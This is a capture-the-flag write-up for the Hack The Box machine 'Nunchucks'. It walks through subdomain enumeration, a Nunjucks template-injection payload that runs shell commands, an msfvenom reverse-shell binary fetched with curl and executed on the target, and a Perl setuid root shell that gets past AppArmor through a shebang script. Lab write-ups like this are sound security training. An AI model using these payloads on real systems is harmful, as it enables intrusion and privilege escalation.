# Nunchucks Writeup

objetives :
* user flag
* root flag

---

## User.txt

### Basic Enumeration

the ICMP TTL indicates that it's a Linux Machine  

nmap :
* p22	OpenSSH 8.2p1
* p80	nginx 1.18.0 (Ubuntu)
* p443	nginx 1.18.0 (Ubuntu)

the port 80 server is just a redirection to port 443 server

### Web

having a quick look at the page it seems like there is a signup and login page but neither of them are working  
we try directory enumeration, its a little tricky cause every request gives a 200 status, so we have to filter by size  
we don't find any interesting directory  
by the way, while doing all of this we see that the page is using **Node.js**

there is a mail on the main page whit the domain *nunchucks.htb*  
that makes me think that there might be a hidden subdomain  
we use **ffuf** for subdomain enumeration and we find *store.nunchucks.htb*  

### Store

the first thing we see is an textbox asking for an email  
that sends the email to */api/submit*, and we get a response where the email of your input is sent back to you

i get to a point where i can't find anything and i check HTB to see the tags of the machine  
we see the tag **SSTI**, that stands for Server Side Template Injection  
i didn't even know about this vulnerability, so i search for it and i try various payloads  
looks like sending *{{7\*3}}* to */api/submit* works because it responds you with 21  

### Exploiting SSTI 

we try to know which template Node is using by trying payloads on this [link](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)  
we come to the conclusion that its using **NUNJUCKS**

after a lot of tries, i find a payload that actually works :  
```
{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"whoami\")')()}}
```
the reason why i needed a lot of tries is because the payload i found had single quotes instead of backslash + double quotes  
that is, `'child_process'` insted of `\"child_process\"`

### Upgrading RCE to a Reverse Shell

the most common reverse shell payloads are not working for me, so i though about creating a reverse shell executable with **msfvenom**  
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf`  
now i create a server on my machine with Python and use the **SSTI** and the **curl** command to upload it to the target machine  
i give execution permisions to the file with **chmod** and then set a **netcat listener**  
now i execute the file... it works !!! we have a Reverse Shell and user.txt

---

## Root.txt

we search binaries capabilities and we find that **perl** has the following capabilitie : *cap_setuid+ep*  
there is an entry in GTFOBins to exploit this, the payload is 
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
it doesn't work, but it works with *whoami* instead of */bin/sh*... what is happening ?  

this kind of behaviour in a program reminds me of the security module **AppArmor**  
so we find files containing the word *AppArmor*  
there are plenty of them !! we find an interesting folder at */etc/apparmor.d* whit a file called *usr.bin.perl*  
it seems that is denying us the acces to */root*  
is there any way to bypass that ? time to ask Google !!  

there is a pretty interesting bug about this topic on [this link](https://bugs.launchpad.net/apparmor/+bug/1911431)  
it says that you can bypass it with a script starting with a **shebang line** (#!/usr/bin/perl)  
lets try it !! we write this script called *shell.perl*
```perl
#!/usr/bin/perl

use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/bash";
```
we give execution permission to it, we execute it with ```./shell.perl``` and voilá !!! there you go  
enjoy your root acces !

